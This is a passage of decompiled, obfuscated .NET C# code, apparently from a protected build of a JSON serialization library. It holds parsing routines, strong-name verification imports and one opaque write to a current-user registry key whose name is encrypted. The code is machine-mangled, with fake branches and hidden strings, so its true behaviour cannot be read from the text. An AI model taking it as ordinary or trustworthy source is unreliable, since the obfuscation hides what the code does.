            num2 = (int) *(sbyte*) ((IntPtr) voidPtr + 1);
            if (false)
            {
              num5 = num2;
              num4 = num1;
              goto label_1;
            }
            else
              goto label_17;
label_19:
            ch = obj0.\u0001[obj0.\u0002];
            if (true)
            {
              if (ch != char.MinValue)
              {
                num4 = (int) ch;
                num5 = 10;
                goto label_1;
              }
              else
                goto label_4;
            }
          }
          while (false);
          goto label_22;
label_4:
          if (obj0.\u0001 == obj0.\u0002)
          {
            num3 = 0;
            if (num3 != 0)
              goto label_3;
          }
          else
            goto label_9;
        }
        while (\u0014.\u0006.\u0001(num3 != 0, obj0) != 0);
        goto label_7;
label_3:
        if (num3 == 13)
        {
          \u0014.\u0006.\u0001(obj0, false);
          continue;
        }
        if (ch != ' ' && !\u009A.\u0005\u0004(ch))
        {
          *(sbyte*) voidPtr = (sbyte) 1;
          continue;
        }
        goto label_13;
label_7:
        if (true)
        {
          *(sbyte*) voidPtr = (sbyte) 1;
          continue;
        }
        goto label_13;
label_9:
        ++obj0.\u0002;
        continue;
label_11:
        \u0014.\u0006.\u0001(obj0);
        continue;
label_22:
        num3 = (int) ch;
        goto label_3;
      }
label_17:
      return (num1 | num2) != 0;
label_18:
      *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 0;
      goto label_15;
    }

    static bool \u0001([In] JsonSerializerInternalReader obj0, [In] \u0016.\u0007 obj1)
    {
      int num;
      // ISSUE: type reference
      while (obj1 != null && (object) obj1.\u0002() != (object) \u0004\u0002.\u0084\u0004(__typeref (object)))
      {
        if (true)
        {
          num = obj1.\u0001 == \u0003.\u0005.\u000E ? 1 : 0;
          goto label_3;
        }
      }
      goto label_5;
label_3:
      if (true)
        return num != 0;
      goto label_6;
label_5:
      num = 1;
label_6:
      if (num != 0 && num != 0)
        return num != 0;
      goto label_3;
    }

    static bool \u0001(
      ref \u0016.\u0007 _param0,
      object _param1,
      JsonProperty _param2,
      ref object _param3,
      JsonProperty _param4,
      [Out] JsonWriter _param5,
      [Out] \u0010.\u0006 _param6,
      [In] \u0006.\u0002 obj7)
    {
      if (!_param2.\u0001() && _param2.\u0002() && \u0014.\u0006.\u0001(_param5, _param2, _param1, _param6) && \u0014.\u0006.\u0001(_param2, _param1, _param5, _param6))
      {
        if (_param2.\u0001() == null)
          _param2.\u0001(((\u0016.\u0008) _param6).\u0001.\u0001.\u0001(_param2.\u0001));
        _param3 = _param2.\u0001().\u0001(_param1);
        _param0 = _param2.\u0001().\u0005 ? _param2.\u0001() : \u0014.\u0006.\u0001(_param3, _param6);
        if (\u0014.\u0006.\u0001(_param3, _param2, _param6))
        {
          if (\u0014.\u0006.\u0001(_param3, _param0, _param2, _param4, obj7, _param6))
          {
            \u0014.\u0006.\u0001(_param2, _param5);
            \u0014.\u0006.\u0001(_param3, _param5, _param6);
            return false;
          }
          if (!\u0014.\u0006.\u0001(_param6, _param5, _param3, _param2, _param0, obj7, _param4))
            return false;
          if (_param3 == null)
          {
            \u0011.\u0008 obj = obj7 as \u0011.\u0008;
            switch ((int) _param2.\u0001 ?? (int) obj?.\u0001() ?? 0)
            {
              case 2:
                throw \u0014.\u0006.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(_param5), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(24088), (IFormatProvider) \u0098.\u0002\u0004(), (object) _param2.\u0001), (Exception) null);
              case 3:
                throw \u0014.\u0006.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(_param5), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(24185), (IFormatProvider) \u0098.\u0002\u0004(), (object) _param2.\u0001), (Exception) null);
            }
          }
          return true;
        }
      }
      _param0 = (\u0016.\u0007) null;
      _param3 = (object) null;
      return false;
    }

    static void \u0001([In] string obj0)
    {
      RegistryKey registryKey;
      if (true)
      {
        registryKey = \u0016\u0005.\u007E\u0011\u000E((object) Registry.CurrentUser, \u0014.\u0006.\u0082(23793), true);
        goto label_5;
      }
label_3:
      \u008D.\u007E\u0092\u0003((object) registryKey, \u001B.\u0006\u0003(obj0), (object) obj0);
      if (true)
        return;
label_5:
      if (registryKey != null)
        goto label_3;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static bool \u0001([In] MemberInfo obj0, [In] bool obj1)
    {
      MemberTypes memberTypes = \u0015.\u000E.\u0001(obj0);
      if (memberTypes != MemberTypes.Field)
      {
        if (memberTypes != MemberTypes.Property)
          return false;
      }
      else
        goto label_20;
label_10:
      PropertyInfo propertyInfo = (PropertyInfo) obj0;
      if (!\u0015\u0002.\u007E\u001F\u0005((object) propertyInfo))
        return false;
      int num1 = obj1 ? 1 : 0;
label_14:
      if (num1 != 0)
      {
        int num2 = 1;
        return num2 == 0 ? num2 != 0 : num2 != 0;
      }
label_17:
      int num3 = \u0010\u0004.\u007E\u0001\u0008((object) propertyInfo, obj1) != null ? 1 : 0;
      return false ? num3 != 0 : num3 != 0;
label_20:
      FieldInfo fieldInfo = (FieldInfo) obj0;
      if (true)
      {
        if (obj1)
          return true;
        if (true)
        {
          int num4 = \u0015\u0002.\u007E\u001D\u0005((object) fieldInfo) ? 1 : 0;
          if (true)
            return num4 != 0;
          num1 = num4;
          goto label_14;
        }
        else
          goto label_17;
      }
      else
        goto label_10;
    }

    static int? \u0001([In] \u0015.\u0013 obj0)
    {
      int? nullable;
      if (obj0 == null)
        nullable = new int?();
      else
        goto label_13;
label_12:
      return nullable;
label_13:
      \u0006.\u0005 obj1 = \u0014.\u0006.\u0001(obj0);
      if (obj1 != null)
      {
        int num = 1;
        int int32;
        while (true)
        {
          JTokenType[] jtokenTypeArray = \u0015.\u0013.\u0002;
          \u0006.\u0005 obj2 = obj1;
          if (\u0014.\u0006.\u0001(num != 0, jtokenTypeArray, (\u0015.\u0013) obj2))
          {
            if (true)
            {
              if (obj1.\u0001 != null)
              {
                int32 = Convert.ToInt32(obj1.\u0001, (IFormatProvider) CultureInfo.InvariantCulture);
                if (false)
                  num = int32;
                else
                  goto label_11;
              }
              else
                break;
            }
            else
              goto label_12;
          }
          else
            goto label_5;
        }
        if (true)
          return new int?();
        goto label_12;
label_11:
        return new int?(int32);
      }
label_5:
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21210), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
    }

    static \u0006.\u0001 \u0001([In] \u0016.\u0001 obj0)
    {
      \u0006.\u0001? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (\u0006.\u0001) num;
      return num == 0 ? \u0006.\u0001.\u0001 : nullable.GetValueOrDefault();
    }

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      int num1 = obj0.\u0002;
      if (true)
        goto label_18;
label_1:
      if (false)
        goto label_14;
      else
        goto label_20;
label_8:
      int index;
      if (obj0.\u0001 != index || \u0014.\u0006.\u0001(true, obj0) == 0)
        return;
      goto label_19;
label_14:
      if (num1 != 0)
        return;
      char ch1;
      if (true)
      {
        if (ch1 == ',' || ch1 == '}' || ch1 == ']' || ch1 == ')' || ch1 == '/')
          return;
        throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(24294), (IFormatProvider) \u0098.\u0002\u0004(), (object) ch1));
      }
      goto label_8;
label_20:
      char ch2 = (char) num1;
      if (ch2 > 'F')
        goto label_23;
      else
        goto label_21;
label_6:
      int num2;
      int num3;
      if (num2 != num3)
        goto label_12;
label_11:
      ++index;
      goto label_19;
label_12:
      obj0.\u0002 = index;
      if (true)
      {
        ch1 = obj0.\u0001[obj0.\u0002];
        num1 = \u009A.\u0005\u0004(ch1) ? 1 : 0;
        goto label_14;
      }
label_21:
      if (ch2 == char.MinValue)
      {
        obj0.\u0002 = index;
        goto label_8;
      }
      else
      {
        int num4 = (int) ch2;
        int num5 = 43;
        if (num5 != 0)
        {
          switch (num4 - num5)
          {
            case 0:
            case 2:
            case 3:
            case 5:
            case 6:
            case 7:
            case 8:
            case 9:
            case 10:
            case 11:
            case 12:
            case 13:
            case 14:
            case 22:
            case 23:
            case 24:
            case 25:
            case 26:
            case 27:
              goto label_11;
            default:
              goto label_12;
          }
        }
        else
        {
          num3 = num5;
          num2 = num4;
          goto label_6;
        }
      }
label_23:
      if (ch2 != 'X')
      {
        switch (ch2)
        {
          case 'a':
          case 'b':
          case 'c':
          case 'd':
          case 'e':
          case 'f':
            goto label_11;
          default:
            num2 = (int) ch2;
            num3 = 120;
            goto label_6;
        }
      }
      else
        goto label_11;
label_18:
      index = num1;
label_19:
      num1 = (int) obj0.\u0001[index];
      goto label_1;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static bool \u0001(ref DateTimeOffset _param0, [Out] \u0015.\u0008 _param1)
    {
      \u0010.\u0002 obj = new \u0010.\u0002();
      if (!obj.\u0001(_param1.\u0001(), _param1.\u0001(), _param1.\u0002()))
      {
        _param0 = new DateTimeOffset();
        return false;
      }
      DateTime dateTime1 = \u0014.\u0006.\u0001(obj);
      DateTime dateTime2;
      if (true)
        dateTime2 = dateTime1;
      TimeSpan offset;
      switch (obj.\u0001)
      {
        case \u0012.\u0008.\u0002:
          offset = new TimeSpan(0L);
          break;
        case \u0012.\u0008.\u0003:
          offset = new TimeSpan(-obj.\u0008, -obj.\u000E, 0);
          break;
        case \u0012.\u0008.\u0004:
label_5:
          offset = new TimeSpan(obj.\u0008, obj.\u000E, 0);
          break;
        default:
          offset = \u0082\u0002.\u007E\u0093\u0005((object) \u0081\u0002.\u0092\u0005(), dateTime2);
          break;
      }
      long num1 = dateTime2.Ticks;
      long num2 = offset.Ticks;
      long num3;
      if (true)
      {
        num3 = num1 - num2;
        long num4 = num3;
        num2 = 0L;
        num1 = num4;
      }
      if (num1 < num2 || num3 > 3155378975999999999L)
      {
        if (true)
        {
          _param0 = new DateTimeOffset();
          return false;
        }
        goto label_5;
      }
      else
      {
        _param0 = new DateTimeOffset(dateTime2, offset);
        int num5 = 1;
        if (num5 == 0)
          return num5 != 0;
        return num5 == 0 ? num5 != 0 : num5 != 0;
      }
    }

    static \u0015.\u0013 \u0001([In] object obj0, [In] \u0004.\u0011 obj1)
    {
      if (obj0 == null)
        return (\u0015.\u0013) null;
      return obj0 is \u0015.\u0013 ? (\u0015.\u0013) obj0 : throw new ArgumentException(\u0014.\u0006.\u0082(24375));
    }

    static \u0002.\u0004 \u0001([In] \u0012.\u0007 obj0, [In] \u000F.\u0007 obj1)
    {
      while (true)
      {
        if (obj0.\u0001() == JsonToken.None)
        {
          if (true)
          {
            if (!obj0.\u0001())
              break;
          }
          else
            continue;
        }
        \u0014.\u0006.\u0001(obj0);
        \u0002.\u0004 obj = obj0.\u0001() == JsonToken.PropertyName ? new \u0002.\u0004((string) obj0.\u0001()) : throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(24469), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001()));
        \u0014.\u0006.\u0001((\u0015.\u0013) obj, obj0 as \u000F.\u0001, obj1);
        \u0014.\u0006.\u0001((\u0004.\u0011) obj, obj0, obj1);
        return obj;
      }
      throw \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(24412));
    }

    static DateTime \u0001([In] long obj0) => new DateTime(obj0 * 10000L + \u0004.\u0007.\u0001, DateTimeKind.Utc);

    static \u0004.\u0005 \u0001([In] \u0005.\u0004 obj0)
    {
      while (obj0.\u0001 == null)
      {
        if (true)
        {
          obj0.\u0001 = new \u0004.\u0005(obj0.\u0001);
          break;
        }
      }
      return obj0.\u0001;
    }

    static unsafe void \u0001([In] \u0011.\u0003 obj0, [In] bool obj1)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(5);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num1;
      ++obj0.\u0002;
label_1:
      int num2;
      for (int index = \u0014.\u0006.\u0001(obj0, 1, false) ? 1 : 0; index != 0; index = num2)
      {
        do
        {
          if (obj0.\u0001[obj0.\u0002] == '*')
            *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
          else if (obj0.\u0001[obj0.\u0002] == '/')
            *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
          else
            goto label_5;
          ++obj0.\u0002;
        }
        while (false);
        goto label_7;
label_5:
        throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(24639), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001[obj0.\u0002]));
label_7:
        *(int*) voidPtr = obj0.\u0002;
label_8:
        do
        {
          char ch = obj0.\u0001[obj0.\u0002];
          do
          {
            switch (ch)
            {
              case char.MinValue:
              case '\u0001':
              case '\u0002':
              case '\u0003':
              case '\u0004':
              case '\u0005':
              case '\u0006':
              case '\a':
              case '\b':
              case '\t':
              case '\n':
                if (true)
                {
                  switch (ch)
                  {
                    case char.MinValue:
                      if (obj0.\u0001 == obj0.\u0002)
                      {
                        if (\u0014.\u0006.\u0001(true, obj0) == 0)
                        {
                          if (*(sbyte*) ((IntPtr) voidPtr + 4) == (sbyte) 0)
                            throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(24586));
                          \u0014.\u0006.\u0001(obj0, obj1, *(int*) voidPtr, obj0.\u0002);
                          return;
                        }
                        goto label_8;
                      }
                      else
                      {
                        ++obj0.\u0002;
                        goto label_8;
                      }
                    case '\n':
                      if (*(sbyte*) ((IntPtr) voidPtr + 4) != (sbyte) 0)
                      {
                        \u0014.\u0006.\u0001(obj0, obj1, *(int*) voidPtr, obj0.\u0002);
                        return;
                      }
                      continue;
                    default:
                      goto label_31;
                  }
                }
                else
                  goto label_8;
              case '\r':
                if (*(sbyte*) ((IntPtr) voidPtr + 4) != (sbyte) 0)
                {
                  \u0014.\u0006.\u0001(obj0, obj1, *(int*) voidPtr, obj0.\u0002);
                  return;
                }
                \u0014.\u0006.\u0001(obj0, true);
                goto label_8;
              case '*':
                if (true)
                {
                  ++obj0.\u0002;
                  if (*(sbyte*) ((IntPtr) voidPtr + 4) == (sbyte) 0)
                  {
                    num2 = \u0014.\u0006.\u0001(obj0, 0, true) ? 1 : 0;
                    if (true)
                    {
                      if (num2 == 0 || obj0.\u0001[obj0.\u0002] != '/')
                        goto label_8;
                    }
                    else
                      goto label_1;
                  }
                  else
                    goto label_8;
                }
                \u0014.\u0006.\u0001(obj0, obj1, *(int*) voidPtr, obj0.\u0002 - 1);
                if (true)
                {
                  ++obj0.\u0002;
                  return;
                }
                goto case char.MinValue;
              default:
                goto label_31;
            }
          }
          while (false);
          \u0014.\u0006.\u0001(obj0);
          continue;
label_31:
          ++obj0.\u0002;
        }
        while (false);
        goto label_8;
      }
      throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(24586));
    }

    static void \u0001(
      [In] XmlNodeConverter obj0,
      [In] \u0012.\u0007 obj1,
      [In] \u0011.\u000E obj2,
      [In] IXmlNode obj3,
      [In] string obj4,
      [In] XmlNamespaceManager obj5)
    {
      if (global::\u0007.\u009E(obj4))
        throw \u0014.\u0006.\u0001(obj1, \u0014.\u0006.\u0082(24700));
      if (true)
        goto label_20;
label_7:
      string str1;
      string str2;
      \u0014.\u0006.\u0001(str1, obj5, obj1, obj2, str2, obj3);
      return;
label_20:
      Dictionary<string, string> dictionary = \u0014.\u0006.\u0001(obj0, obj1, obj5);
label_3:
      string str3 = \u0014.\u0006.\u0001(obj4);
label_4:
      while (!\u0002.\u0002.\u0001(obj4, '@'))
      {
        while (\u0002.\u0002.\u0001(obj4, '$'))
        {
          if (true)
          {
            if (true)
            {
              string str4;
              if (\u0007\u0002.\u008C\u0004(obj4, \u0014.\u0006.\u0082(9827)))
              {
                if (true)
                {
                  if (true)
                  {
                    obj4 = \u0097\u0002.\u007E\u001C\u0006((object) obj4, 1);
                    string str5 = \u0016\u0003.\u007E\u009E\u0006((object) obj5, \u0014.\u0006.\u0082(9935));
                    obj0.\u0001(obj1, obj2, obj3, obj4, obj5, str5, dictionary);
                    if (true)
                      return;
                    goto label_6;
                  }
                }
                else
                  continue;
              }
              else
                str4 = \u0097\u0002.\u007E\u001C\u0006((object) obj4, 1);
              string str6 = \u0016\u0003.\u007E\u009E\u0006((object) obj5, \u0014.\u0006.\u0082(9935));
              if (true)
              {
                \u0014.\u0006.\u0001(str4, obj5, obj1, obj2, str6, obj3);
                return;
              }
              goto label_3;
            }
          }
          else
            goto label_4;
        }
        obj0.\u0001(obj1, obj2, obj3, obj4, obj5, str3, dictionary);
        return;
      }
      str1 = \u0097\u0002.\u007E\u001C\u0006((object) obj4, 1);
label_6:
      str2 = \u0014.\u0006.\u0001(str1);
      goto label_7;
    }

    static bool \u0001(\u0015.\u0012 _param0, [Out] string _param1, [In] ref \u0015.\u0013 obj2)
    {
      if (_param0.\u0001 == null)
      {
        obj2 = (\u0015.\u0013) null;
        if (true)
        {
          int num = 0;
          return num != 0 ? num != 0 : num != 0;
        }
      }
      return _param0.\u0001.TryGetValue(_param1, out obj2);
    }

    static JsonReaderException \u0001([In] \u0012.\u0007 obj0) => \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(16757));

    static void \u0001([In] \u0012.\u0007 obj0, [In] JsonToken obj1) => \u0014.\u0006.\u0001(obj0, obj1, (object) null, true);

    static StringWriter \u0001([In] int obj0) => new StringWriter(new StringBuilder(obj0), (IFormatProvider) \u0098.\u0002\u0004());

    static \u0006() => SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (\u0014.\u0006));
  }
}
